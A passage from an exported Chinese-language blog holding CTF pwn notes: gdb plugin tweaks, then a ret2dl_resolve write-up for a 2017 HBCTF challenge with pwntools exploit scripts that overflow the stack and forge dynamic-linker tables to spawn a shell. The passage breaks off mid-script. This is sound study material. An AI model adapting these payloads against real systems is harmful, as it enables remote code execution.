\"\"\"libheap command help listing\"\"\"\n\n# 主要就是__init__这里存在注册功能\n    def __init__(self, debugger=None, version=None):\n        super(heap, self).__init__(\"libheap\", gdb.COMMAND_OBSCURE,\n                                   gdb.COMPLETE_NONE)\n```\n\n当然，下面的功能名最好也改改。。。\n```\n    def invoke(self, arg, from_tty):\n        # XXX: self.dbg.string_to_argv\n        if arg.find(\"-h\") != -1:\n            # print_header(\"heap \", end=\"\")\n            # print(\"Options:\", end=\"\\n\\n\")\n            # print_header(\"{:<15}\".format(\"-a 0x1234\"))\n            # print(\"Specify an arena address\")\n            print_header(\"{:<15}\".format(\"libheapls\"))\n            print(\"Print a flat listing of all chunks in an arena\")\n            print_header(\"{:<15}\".format(\"libfastbins [#]\"))\n            print(\"Print all fast bins, or only a single fast bin\")\n            print_header(\"{:<15}\".format(\"libsmallbins [#]\"))\n            print(\"Print all small bins, or only a single small bin\")\n            print_header(\"{:<15}\".format(\"libfreebins\"))\n            print(\"Print compact bin listing (only free chunks)\")\n            print_header(\"{:<15}\".format(\"libheaplsc\"))\n            print(\"Print compact arena listing (all chunks)\")\n            print_header(\"{:<15}\".format(\"libmstats\"), end=\"\")\n            print(\"Print memory alloc statistics similar to malloc_stats(3)\")\n            # print_header(\"{:<22}\".format(\"print_bin_layout [#]\"), end=\"\")\n            # print(\"Print the layout of a particular free bin\")\n            return\n```\n\n学习了一下gdb的python脚本写法，过两天改改pwndbg，添加点别的功能。。\n\n## 新工具\n\n[pwngdb一个专门用来打ctfpwn的gdb增强脚本](https://github.com/scwuaptx/Pwngdb)\n\n用来功能的确好用。\n\n## i386的libc-dbg安装\n\n在使用heap命令时发现需要装32位的libc-dbg，于是上网查了查方法\n```\ndpkg --print-architecture\napt-get update\napt-get install libc6-dbg:i386\n```\n\n[Unable to locate package libc6-dbg:i386 in docker](https://askubuntu.com/questions/551840/unable-to-locate-package-libc6-dbgi386-in-docker/552273)\n\n## gdb一些命令\n\n`watch expr` 设置写watchpoint，当应用程序写expr, 修改其值时，程序停止运行\n`rwatch expr`设置读watchpoint，当应用程序读表达式expr时，程序停止运行\n`awatch expr`设置读写watchpoint, 当应用程序读或者写表达式expr时，程序都会停止运行\n\n## 关于Kali\n\n[Kali的拓容操作](http://blog.csdn.net/mazhuang2007/article/details/68925815)","source":"_posts/pwn的一些小心得.md","raw":"---\ntitle: pwn的一些小心得\ntags:\n  - pwndbg\n  - libheap\ncategories: []\ndate: 2017-04-26 20:19:33\n---\n\n## libheaps与pwndbg兼容\n\n其实本来也不存在conflict，就是几个命令用了同样的名字，所以我安装libheap的时候就改了几个命令的名字。\n\n注册command的文件在这个目录下：\n`/root/libheap/libheap/frontend/commands/gdb`\n\n改几个注册名就好，下面以我把`heap`改为`libheap`为例，当然可能改成`heap_lib`这种更合适。。。\n<!--more-->\n```\nclass heap(gdb.Command):\n    \"\"\"libheap command help listing\"\"\"\n\n# 主要就是__init__这里存在注册功能\n    def __init__(self, debugger=None, version=None):\n        super(heap, self).__init__(\"libheap\", gdb.COMMAND_OBSCURE,\n                                   gdb.COMPLETE_NONE)\n```\n\n当然，下面的功能名最好也改改。。。\n```\n    def invoke(self, arg, from_tty):\n        # XXX: self.dbg.string_to_argv\n        if arg.find(\"-h\") != -1:\n            # print_header(\"heap \", end=\"\")\n            # print(\"Options:\", end=\"\\n\\n\")\n            # print_header(\"{:<15}\".format(\"-a 0x1234\"))\n            # print(\"Specify an arena address\")\n            print_header(\"{:<15}\".format(\"libheapls\"))\n            print(\"Print a flat listing of all chunks in an arena\")\n            print_header(\"{:<15}\".format(\"libfastbins [#]\"))\n            print(\"Print all fast bins, or only a single fast bin\")\n            print_header(\"{:<15}\".format(\"libsmallbins [#]\"))\n            print(\"Print all small bins, or only a single small bin\")\n            print_header(\"{:<15}\".format(\"libfreebins\"))\n            print(\"Print compact bin listing (only free chunks)\")\n            print_header(\"{:<15}\".format(\"libheaplsc\"))\n            print(\"Print compact arena listing (all chunks)\")\n            print_header(\"{:<15}\".format(\"libmstats\"), end=\"\")\n            print(\"Print memory alloc statistics similar to malloc_stats(3)\")\n            # print_header(\"{:<22}\".format(\"print_bin_layout [#]\"), end=\"\")\n            # print(\"Print the layout of a particular free bin\")\n            return\n```\n\n学习了一下gdb的python脚本写法，过两天改改pwndbg，添加点别的功能。。\n\n## 新工具\n\n[pwngdb一个专门用来打ctfpwn的gdb增强脚本](https://github.com/scwuaptx/Pwngdb)\n\n用来功能的确好用。\n\n## i386的libc-dbg安装\n\n在使用heap命令时发现需要装32位的libc-dbg，于是上网查了查方法\n```\ndpkg --print-architecture\napt-get update\napt-get install libc6-dbg:i386\n```\n\n[Unable to locate package libc6-dbg:i386 in docker](https://askubuntu.com/questions/551840/unable-to-locate-package-libc6-dbgi386-in-docker/552273)\n\n## gdb一些命令\n\n`watch expr` 设置写watchpoint，当应用程序写expr, 修改其值时，程序停止运行\n`rwatch expr`设置读watchpoint，当应用程序读表达式expr时，程序停止运行\n`awatch expr`设置读写watchpoint, 当应用程序读或者写表达式expr时，程序都会停止运行\n\n## 关于Kali\n\n[Kali的拓容操作](http://blog.csdn.net/mazhuang2007/article/details/68925815)","slug":"pwn的一些小心得","published":1,"updated":"2017-05-17T00:46:35.192Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k39004dhv18oxvzy0qo","content":"<h2 id=\"libheaps与pwndbg兼容\"><a href=\"#libheaps与pwndbg兼容\" class=\"headerlink\" title=\"libheaps与pwndbg兼容\"></a>libheaps与pwndbg兼容</h2><p>其实本来也不存在conflict，就是几个命令用了同样的名字，所以我安装libheap的时候就改了几个命令的名字。</p>\n<p>注册command的文件在这个目录下：<br><code>/root/libheap/libheap/frontend/commands/gdb</code></p>\n<p>改几个注册名就好，下面以我把<code>heap</code>改为<code>libheap</code>为例，当然可能改成<code>heap_lib</code>这种更合适。。。<br><a id=\"more\"></a><br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">heap</span><span class=\"params\">(gdb.Command)</span>:</span></div><div class=\"line\">    <span class=\"string\">\"\"\"libheap command help listing\"\"\"</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 主要就是__init__这里存在注册功能</span></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, debugger=None, version=None)</span>:</span></div><div class=\"line\">        super(heap, self).__init__(<span class=\"string\">\"libheap\"</span>, gdb.COMMAND_OBSCURE,</div><div class=\"line\">                                   gdb.COMPLETE_NONE)</div></pre></td></tr></table></figure></p>\n<p>当然，下面的功能名最好也改改。。。<br><figure class=\"highlight aspectj\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div></pre></td><td class=\"code\"><pre><div class=\"line\">def invoke(self, arg, from_tty):</div><div class=\"line\">    # XXX: self.dbg.string_to_argv</div><div class=\"line\">    <span class=\"keyword\">if</span> arg.find(<span class=\"string\">\"-h\"</span>) != -1:</div><div class=\"line\">        # print_header(<span class=\"string\">\"heap \"</span>, end=<span class=\"string\">\"\"</span>)</div><div class=\"line\">        # print(<span class=\"string\">\"Options:\"</span>, end=<span class=\"string\">\"\\n\\n\"</span>)</div><div class=\"line\">        # print_header(<span class=\"string\">\"&#123;:&lt;15&#125;\"</span>.format(<span class=\"string\">\"-a 0x1234\"</span>))</div><div class=\"line\">        # print(<span class=\"string\">\"Specify an arena address\"</span>)</div><div class=\"line\">        print_header(<span class=\"string\">\"&#123;:&lt;15&#125;\"</span>.format(<span class=\"string\">\"libheapls\"</span>))</div><div class=\"line\">        print(<span class=\"string\">\"Print a flat listing of all chunks in an arena\"</span>)</div><div class=\"line\">        print_header(<span class=\"string\">\"&#123;:&lt;15&#125;\"</span>.format(<span class=\"string\">\"libfastbins [#]\"</span>))</div><div class=\"line\">        print(<span class=\"string\">\"Print all fast bins, or only a single fast bin\"</span>)</div><div class=\"line\">        print_header(<span class=\"string\">\"&#123;:&lt;15&#125;\"</span>.format(<span class=\"string\">\"libsmallbins [#]\"</span>))</div><div class=\"line\">        print(<span class=\"string\">\"Print all small bins, or only a single small bin\"</span>)</div><div class=\"line\">        print_header(<span class=\"string\">\"&#123;:&lt;15&#125;\"</span>.format(<span class=\"string\">\"libfreebins\"</span>))</div><div class=\"line\">        print(<span class=\"string\">\"Print compact bin listing (only free chunks)\"</span>)</div><div class=\"line\">        print_header(<span class=\"string\">\"&#123;:&lt;15&#125;\"</span>.format(<span class=\"string\">\"libheaplsc\"</span>))</div><div class=\"line\">        print(<span class=\"string\">\"Print compact arena listing (all chunks)\"</span>)</div><div class=\"line\">        print_header(<span class=\"string\">\"&#123;:&lt;15&#125;\"</span>.format(<span class=\"string\">\"libmstats\"</span>), end=<span class=\"string\">\"\"</span>)</div><div class=\"line\">        print(<span class=\"string\">\"Print memory alloc statistics similar to malloc_stats(3)\"</span>)</div><div class=\"line\">        # print_header(<span class=\"string\">\"&#123;:&lt;22&#125;\"</span>.format(<span class=\"string\">\"print_bin_layout [#]\"</span>), end=<span class=\"string\">\"\"</span>)</div><div class=\"line\">        # print(<span class=\"string\">\"Print the layout of a particular free bin\"</span>)</div><div class=\"line\">        <span class=\"keyword\">return</span></div></pre></td></tr></table></figure></p>\n<p>学习了一下gdb的python脚本写法，过两天改改pwndbg，添加点别的功能。。</p>\n<h2 id=\"新工具\"><a href=\"#新工具\" class=\"headerlink\" title=\"新工具\"></a>新工具</h2><p><a href=\"https://github.com/scwuaptx/Pwngdb\" target=\"_blank\" rel=\"external\">pwngdb一个专门用来打ctfpwn的gdb增强脚本</a></p>\n<p>用来功能的确好用。</p>\n<h2 id=\"i386的libc-dbg安装\"><a href=\"#i386的libc-dbg安装\" class=\"headerlink\" title=\"i386的libc-dbg安装\"></a>i386的libc-dbg安装</h2><p>在使用heap命令时发现需要装32位的libc-dbg，于是上网查了查方法<br><figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">dpkg --<span class=\"keyword\">print</span>-architecture</div><div class=\"line\">apt-<span class=\"built_in\">get</span> <span class=\"keyword\">update</span></div><div class=\"line\">apt-<span class=\"built_in\">get</span> install libc6-db<span class=\"variable\">g:i386</span></div></pre></td></tr></table></figure></p>\n<p><a href=\"https://askubuntu.com/questions/551840/unable-to-locate-package-libc6-dbgi386-in-docker/552273\" target=\"_blank\" rel=\"external\">Unable to locate package libc6-dbg:i386 in docker</a></p>\n<h2 id=\"gdb一些命令\"><a href=\"#gdb一些命令\" class=\"headerlink\" title=\"gdb一些命令\"></a>gdb一些命令</h2><p><code>watch expr</code> 设置写watchpoint，当应用程序写expr, 修改其值时，程序停止运行<br><code>rwatch expr</code>设置读watchpoint，当应用程序读表达式expr时，程序停止运行<br><code>awatch expr</code>设置读写watchpoint, 当应用程序读或者写表达式expr时，程序都会停止运行</p>\n<h2 id=\"关于Kali\"><a href=\"#关于Kali\" class=\"headerlink\" title=\"关于Kali\"></a>关于Kali</h2><p><a href=\"http://blog.csdn.net/mazhuang2007/article/details/68925815\" target=\"_blank\" rel=\"external\">Kali的拓容操作</a></p>\n","excerpt":"<h2 id=\"libheaps与pwndbg兼容\"><a href=\"#libheaps与pwndbg兼容\" class=\"headerlink\" title=\"libheaps与pwndbg兼容\"></a>libheaps与pwndbg兼容</h2><p>其实本来也不存在conflict，就是几个命令用了同样的名字，所以我安装libheap的时候就改了几个命令的名字。</p>\n<p>注册command的文件在这个目录下：<br><code>/root/libheap/libheap/frontend/commands/gdb</code></p>\n<p>改几个注册名就好，下面以我把<code>heap</code>改为<code>libheap</code>为例，当然可能改成<code>heap_lib</code>这种更合适。。。<br></p>","more":"<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">heap</span><span class=\"params\">(gdb.Command)</span>:</span></div><div class=\"line\">    <span class=\"string\">\"\"\"libheap command help listing\"\"\"</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 主要就是__init__这里存在注册功能</span></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, debugger=None, version=None)</span>:</span></div><div class=\"line\">        super(heap, self).__init__(<span class=\"string\">\"libheap\"</span>, gdb.COMMAND_OBSCURE,</div><div class=\"line\">                                   gdb.COMPLETE_NONE)</div></pre></td></tr></table></figure><p></p>\n<p>当然，下面的功能名最好也改改。。。<br><figure class=\"highlight aspectj\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div></pre></td><td class=\"code\"><pre><div class=\"line\">def invoke(self, arg, from_tty):</div><div class=\"line\">    # XXX: self.dbg.string_to_argv</div><div class=\"line\">    <span class=\"keyword\">if</span> arg.find(<span class=\"string\">\"-h\"</span>) != -1:</div><div class=\"line\">        # print_header(<span class=\"string\">\"heap \"</span>, end=<span class=\"string\">\"\"</span>)</div><div class=\"line\">        # print(<span class=\"string\">\"Options:\"</span>, end=<span class=\"string\">\"\\n\\n\"</span>)</div><div class=\"line\">        # print_header(<span class=\"string\">\"&#123;:&lt;15&#125;\"</span>.format(<span class=\"string\">\"-a 0x1234\"</span>))</div><div class=\"line\">        # print(<span class=\"string\">\"Specify an arena address\"</span>)</div><div class=\"line\">        print_header(<span class=\"string\">\"&#123;:&lt;15&#125;\"</span>.format(<span class=\"string\">\"libheapls\"</span>))</div><div class=\"line\">        print(<span class=\"string\">\"Print a flat listing of all chunks in an arena\"</span>)</div><div class=\"line\">        print_header(<span class=\"string\">\"&#123;:&lt;15&#125;\"</span>.format(<span class=\"string\">\"libfastbins [#]\"</span>))</div><div class=\"line\">        print(<span class=\"string\">\"Print all fast bins, or only a single fast bin\"</span>)</div><div class=\"line\">        print_header(<span class=\"string\">\"&#123;:&lt;15&#125;\"</span>.format(<span class=\"string\">\"libsmallbins [#]\"</span>))</div><div class=\"line\">        print(<span class=\"string\">\"Print all small bins, or only a single small bin\"</span>)</div><div class=\"line\">        print_header(<span class=\"string\">\"&#123;:&lt;15&#125;\"</span>.format(<span class=\"string\">\"libfreebins\"</span>))</div><div class=\"line\">        print(<span class=\"string\">\"Print compact bin listing (only free chunks)\"</span>)</div><div class=\"line\">        print_header(<span class=\"string\">\"&#123;:&lt;15&#125;\"</span>.format(<span class=\"string\">\"libheaplsc\"</span>))</div><div class=\"line\">        print(<span class=\"string\">\"Print compact arena listing (all chunks)\"</span>)</div><div class=\"line\">        print_header(<span class=\"string\">\"&#123;:&lt;15&#125;\"</span>.format(<span class=\"string\">\"libmstats\"</span>), end=<span class=\"string\">\"\"</span>)</div><div class=\"line\">        print(<span class=\"string\">\"Print memory alloc statistics similar to malloc_stats(3)\"</span>)</div><div class=\"line\">        # print_header(<span class=\"string\">\"&#123;:&lt;22&#125;\"</span>.format(<span class=\"string\">\"print_bin_layout [#]\"</span>), end=<span class=\"string\">\"\"</span>)</div><div class=\"line\">        # print(<span class=\"string\">\"Print the layout of a particular free bin\"</span>)</div><div class=\"line\">        <span class=\"keyword\">return</span></div></pre></td></tr></table></figure></p>\n<p>学习了一下gdb的python脚本写法，过两天改改pwndbg，添加点别的功能。。</p>\n<h2 id=\"新工具\"><a href=\"#新工具\" class=\"headerlink\" title=\"新工具\"></a>新工具</h2><p><a href=\"https://github.com/scwuaptx/Pwngdb\">pwngdb一个专门用来打ctfpwn的gdb增强脚本</a></p>\n<p>用来功能的确好用。</p>\n<h2 id=\"i386的libc-dbg安装\"><a href=\"#i386的libc-dbg安装\" class=\"headerlink\" title=\"i386的libc-dbg安装\"></a>i386的libc-dbg安装</h2><p>在使用heap命令时发现需要装32位的libc-dbg，于是上网查了查方法<br><figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">dpkg --<span class=\"keyword\">print</span>-architecture</div><div class=\"line\">apt-<span class=\"built_in\">get</span> <span class=\"keyword\">update</span></div><div class=\"line\">apt-<span class=\"built_in\">get</span> install libc6-db<span class=\"variable\">g:i386</span></div></pre></td></tr></table></figure></p>\n<p><a href=\"https://askubuntu.com/questions/551840/unable-to-locate-package-libc6-dbgi386-in-docker/552273\">Unable to locate package libc6-dbg:i386 in docker</a></p>\n<h2 id=\"gdb一些命令\"><a href=\"#gdb一些命令\" class=\"headerlink\" title=\"gdb一些命令\"></a>gdb一些命令</h2><p><code>watch expr</code> 设置写watchpoint，当应用程序写expr, 修改其值时，程序停止运行<br><code>rwatch expr</code>设置读watchpoint，当应用程序读表达式expr时，程序停止运行<br><code>awatch expr</code>设置读写watchpoint, 当应用程序读或者写表达式expr时，程序都会停止运行</p>\n<h2 id=\"关于Kali\"><a href=\"#关于Kali\" class=\"headerlink\" title=\"关于Kali\"></a>关于Kali</h2><p><a href=\"http://blog.csdn.net/mazhuang2007/article/details/68925815\">Kali的拓容操作</a></p>"},{"title":"ret_2_dl_resolve","date":"2017-04-12T07:12:06.000Z","_content":"\n## 前言\n\n最近在学pwn里的沙盒的时候接触到了这个技术，瞬间会想起以前的很多题目原来是可以这样做的。技术原理很简单，理解了linux里的lazy binding就不难理解。\n\n## 利用方式\n> + 控制EIP为PLT[0]的地址，只需传递一个index_arg参数\n+ 控制index_arg的大小，使reloc的位置落在可控地址内\n+ 伪造reloc的内容，使sym落在可控地址内\n+ 伪造sym的内容，使name落在可控地址内\n+ 伪造name为任意库函数，如system\n\n所以我们得出结论，我们最终要伪造三个节信息，分别是`.rel.plt`, `.dynsym`, `.dynstr`，并且在`dynstr`上布置我们希望调用的函数的`str`，比如`system`。并且我们要通过控制`index_args`参数和`eip`指针是的程序按照我们的设计来调用函数。\n\n## Example\n\n以2017hbctf第一场的pwn200来分析\n\n程序逻辑\n```\nint __cdecl main()\n{\n  setvbuf(stdin, 0, 2, 0);\n  setvbuf(stdout, 0, 2, 0);\n  setvbuf(stderr, 0, 2, 0);\n  read_buf();\n  fflush(stdout);\n  return 0;\n}\n```\n```\nssize_t read_buf()\n{\n  char buf; // [sp+6h] [bp-12h]@1\n\n  return read(0, &buf, 0x3Cu);\n}\n```\n\nchecksec\n```\nroot@kali ~/c/2/p/infoless# checksec infoless \n[*] '/root/ctf-problem/2017hbctf/pwn/infoless/infoless'\n    Arch:     i386-32-little\n    RELRO:    No RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n```\n\n除此之外就没有信息了，所以这题考察的就是如何在缺少信息的情况下getshell，这里用到的一种技术就是ret_2_dl_resolve。\n\n关于`.dynamic`：\n```\nroot@kali ~/c/2/p/infoless# readelf -d infoless \n\nDynamic section at offset 0x70c contains 24 entries:\n  标记        类型                         名称/值\n 0x00000001 (NEEDED)                     共享库：[libc.so.6]\n 0x0000000c (INIT)                       0x8048340\n 0x0000000d (FINI)                       0x80485c4\n 0x00000019 (INIT_ARRAY)                 0x8049700\n 0x0000001b (INIT_ARRAYSZ)               4 (bytes)\n 0x0000001a (FINI_ARRAY)                 0x8049704\n 0x0000001c (FINI_ARRAYSZ)               4 (bytes)\n 0x6ffffef5 (GNU_HASH)                   0x804818c\n 0x00000005 (STRTAB)                     0x804825c\n 0x00000006 (SYMTAB)                     0x80481bc\n 0x0000000a (STRSZ)                      109 (bytes)\n 0x0000000b (SYMENT)                     16 (bytes)\n 0x00000015 (DEBUG)                      0x0\n 0x00000003 (PLTGOT)                     0x80497f8\n 0x00000002 (PLTRELSZ)                   32 (bytes)\n 0x00000014 (PLTREL)                     REL\n 0x00000017 (JMPREL)                     0x8048320\n 0x00000011 (REL)                        0x8048300\n 0x00000012 (RELSZ)                      32 (bytes)\n 0x00000013 (RELENT)                     8 (bytes)\n 0x6ffffffe (VERNEED)                    0x80482e0\n 0x6fffffff (VERNEEDNUM)                 1\n 0x6ffffff0 (VERSYM)                     0x80482ca\n 0x00000000 (NULL)                       0x0\n```\nELF文件的.dynamic section里包含了ld.so用于运行时解析函数地址的信息。\n\n通过半天多的努力终于算是理解掌握了ret_to_dl_resolve的利用方法。。正如如上所说，这里的关键点是理解linux的lazy binding的工作方式，由于要伪造三个节信息并且完全计算偏移，所以我认为不熟练的话还是需要花时间调试offset的。但是我看了别人的解法后发现了一个问题，那就是似乎`.dynamic`节似乎是可写的，那么我们似乎可以通过修改`.dynamic`的偏移信息使得直接定位`.dynstr`的地址到我们伪造的`.dynstr(bss)`上了。\n\n参考exp:\n```\n#!/usr/bin/python\n# -*- coding:utf-8 -*- \n \nfrom pwn import *\nfrom time import *\n \nvulFunAddr = 0x080484CB\nreadpltAddr = 0x08048380\nfflushpltAddr = 0x08048390\ndynstrInDynamicAddr = 0x08049750\nbssAddr = 0x08049820\n \nstrTable = ['', 'libc.so.6','_IO_stdin_used', 'fflush', 'stdin', 'read', 'stdout', 'stderr', 'setvbuf','__libc_start_main', '__gmon_start__', 'GLIBC_2.0', '']\nstrTable[3] = 'system'\n#将伪造的dynstr表中的fflush函数给换成system\nbinShellStr = '/bin/sh\\0'\nexpOffset = 22\npayloadHead = 'a'*expOffset\n \ndef writeStrTableToBSS(baseAddr):\n   tempBSS = baseAddr\n    #循环写入伪造的dynstr表\n   for i in strTable:\n       str = i + chr(0)\n       payloadTemp = payloadHead + p32(readpltAddr) + p32(vulFunAddr) + p32(0)+ p32(tempBSS) + p32(len(str)+1)\n       p.send(payloadTemp)\n       sleep(0.1)\n       p.send(str)\n       tempBSS = tempBSS + len(str)\n       sleep(0.1)\n \np = remote('123.206.81.66', 8888)\n#p = remote('127.0.0.1', 8888)\n#p = process('./infoless')\ncontext.log_level = 'debug'\n \n#step 1: 将binShStr写入可写的bss段中\npayload1 = payloadHead + p32(readpltAddr) +p32(vulFunAddr) + p32(0) + p32(bssAddr) + p32(8)\np.send(payload1)\nsleep(0.1)\np.send(binShellStr)\nsleep(0.1)\n \n#step 2: 将伪造的dynstr表写入binShStr后面\ndynstrInBSSAddr = bssAddr +len(binShellStr) + 4\nwriteStrTableToBSS(dynstrInBSSAddr)\n \n#step 3: 将伪造的dynstr表地址写入dynamic中相对应的索引地址\npayload2 = payloadHead + p32(readpltAddr) +p32(vulFunAddr) + p32(0) + p32(dynstrInDynamicAddr) + p32(4)\np.send(payload2)\nsleep(0.1)\np.send(p32(dynstrInBSSAddr))\nsleep(0.1)\n \n#step 4：getshell\npayload3 = payloadHead + p32(fflushpltAddr)+ p32(vulFunAddr) + p32(bssAddr)\np.send(payload3)\nsleep(0.1)\n\np.interactive()\n```\n\n## 思考\n\n于是我有了一个想法，既然`.dynamic`节是可写的，那么`.dynstr`节是否可写呢？其他的节是否还存在可写的呢，节是否可写是否有标志位给出呢？于是我进行了以下的测试。\n\n### 测试`.dynstr`节是否可写\n\nexp:\n```\n#!/usr/bin/env python\n# coding=utf-8\nfrom pwn import *\n\nslog = 1\nlocal = 1\ndebug = 0\n\nglobal p\n\nif slog: context(log_level = 'debug')\nif local:\n    p = process('./infoless')\nelse:\n    p = remote()\n\nif local and debug:\n    gdb.attach(p, open('debug'))\n\noffset = 22\nelf = ELF('./infoless')\nread_plt = elf.symbols['read']\nvuln_addr = 0x80484CB\nbss_addr = 0x8049820\nfflush_plt = elf.symbols['fflush']\n\ndef pwn():\n\n    addr = bss_addr\n    payload1 = offset * 'a' + p32(read_plt) + p32(vuln_addr) + p32(0) + p32(bss_addr) + p32(100)\n    p.sendline(payload1)\n    payload2 = '/bin/sh\\x00'.ljust(20, 'a')\n    p.sendline(payload2)\n\n    addr = 0x8048276\n    gdb,attach(p)\n    payload1 = offset * 'b' + p32(read_plt) + p32(vuln_addr) + p32(0) + p32(addr) + p32(100)\n    p.sendline(payload1)\n    payload2 = 'system\\x00'\n    p.sendline(payload2)\n\n    payload1 = 14 * 'c' + p32(fflush_plt) + p32(0) + p32(bss_addr)\n    p.sendline(payload1)\n\nif __name__ == '__main__':\n    pwn()\n    p.interactive()\n```\n嗯，测试结果不可写= =，但是当我们尝试去写的时候似乎不会报错？（应该是有一个address fault的呀- -）。\n\n### 节的权限\n\n通过gdb的vmmap可以得到权限。当ELF文件被加载到内存中后，系统会将多个具有相同权限Section(节)合并成一个Segment(段)，通常为代码段(可读可执行)，可读可写的数据段，和只读数据段。\n\n```\nwndbg> vmmap \nLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA\n 0x8048000  0x8049000 r-xp     1000 0      /root/ctf-problem/2017hbctf/pwn/infoless/infoless\n 0x8049000  0x804a000 rw-p     1000 0      /root/ctf-problem/2017hbctf/pwn/infoless/infoless\n0xf7dfa000 0xf7dfc000 rw-p     2000 0      \n0xf7dfc000 0xf7fad000 r-xp   1b1000 0      /lib32/libc-2.24.so\n0xf7fad000 0xf7faf000 r--p     2000 1b0000 /lib32/libc-2.24.so\n0xf7faf000 0xf7fb0000 rw-p     1000 1b2000 /lib32/libc-2.24.so\n0xf7fb0000 0xf7fb3000 rw-p     3000 0      \n0xf7fd2000 0xf7fd4000 rw-p     2000 0      \n0xf7fd4000 0xf7fd7000 r--p     3000 0      [vvar]\n0xf7fd7000 0xf7fd9000 r-xp     2000 0      [vdso]\n0xf7fd9000 0xf7ffb000 r-xp    22000 0      /lib32/ld-2.24.so\n0xf7ffc000 0xf7ffd000 r--p     1000 22000  /lib32/ld-2.24.so\n0xf7ffd000 0xf7ffe000 rw-p     1000 23000  /lib32/ld-2.24.so\n0xfffdd000 0xffffe000 rw-p    21000 0      [stack]\n```\n\n### 关于传参\n\n我的一个失败的exp：\n```\n#!/usr/bin/env python\n# coding=utf-8\nfrom pwn import *\n\nslog = 1\nlocal = 1\ndebug = 0\n\nglobal p\n\nif slog: context(log_level = 'debug')\nif local:\n    p = process('./infoless')\nelse:\n    p = remote()\n\nif local and debug:\n    gdb.attach(p, open('debug'))\n\n\nelf = ELF('./infoless')\n\noffset = 22\n# .rel.plt  reloc = reloc + .rel.plt , fake reloc_args to locate reloc on bss\n\n# .dynsym   sym = .dynsym + reloc->info , fake reloc->info to locate sym on bss\n\n# .dynstr   name = .dynstr + sym->value, fake sym->value to locate name on bss\n\n#  name_str fake name_str on bss\n\npr = 0x08048361\nrelplt_addr = 0x8048320\nvuln_addr = 0x80484CB\nplt_addr = 0x8048370\nbss_addr = 0x8049820\ndynsym_addr = 0x80481bc\ndynstr_addr = 0x0804825c\nread_plt = elf.symbols['read']\n\ndef pwn():\n    print 'bss_addr => ', hex(bss_addr)\n\n    # send /bin/sh\n    addr = bss_addr\n    payload1 = offset * 'a' + p32(read_plt) + p32(vuln_addr) + p32(0) + p32(bss_addr) + p32(100)\n    p.sendline(payload1)\n    payload2 = '/bin/sh\\x00'.ljust(20, 'a')\n    p.sendline(payload2)\n    \n    # fake .rel.plt on bss\n    # 0x0804970c      0x00000107\n    addr += len(payload2)\n    payload1 = offset * 'a' + p32(read_plt) + p32(vuln_addr) + p32(0) + p32(addr) + p32(100)\n#    gdb.attach(p, open('debug'))\n    p.sendline(payload1)\n    print 'addr - relplt_addr => ', hex(addr - relplt_addr)\n    off = ((addr - dynsym_addr) / 0x10 + 1) * 0x100 + 0x7\n    print 'off => ', hex(off)\n    payload2 = p32(elf.got['fflush']) + p32(off)\n    p.sendline(payload2)\n#    gdb.attach(p)\n\n    # fake .dynsym on bss\n    # 0x0000001a      0x00000000      0x00000000      0x00000012\n    addr += len(payload2)\n    payload1 = offset * 'a' + p32(read_plt) + p32(vuln_addr) + p32(0) + p32(addr) + p32(100)\n    p.sendline(payload1)\n    off = addr - dynstr_addr + 0x10\n    print 'offset_dynstr => ', hex(off) # 15f0\n    payload2 = p32(off) + p32(0) + p32(0) + p32(0x12)\n#    gdb.attach(p, open('debug'))\n    p.sendline(payload2)\n\n    # fake .dynstr\n    addr += len(payload2)\n    payload1 = offset * 'a' + p32(read_plt) + p32(vuln_addr) + p32(0) + p32(addr) + p32(100)\n    p.sendline(payload1)\n#    gdb.attach(p, open('debug'))\n    payload2 = 'system\\x00'\n    p.sendline(payload2)\n#    gdb.attach(p, open('debug'))\n\n    # fake reloc_args & mov eip, plt[0]\n    reloc_args = bss_addr - relplt_addr + 0x14\n    print 'reloc_args => ', hex(reloc_args)\n    gdb.attach(p, 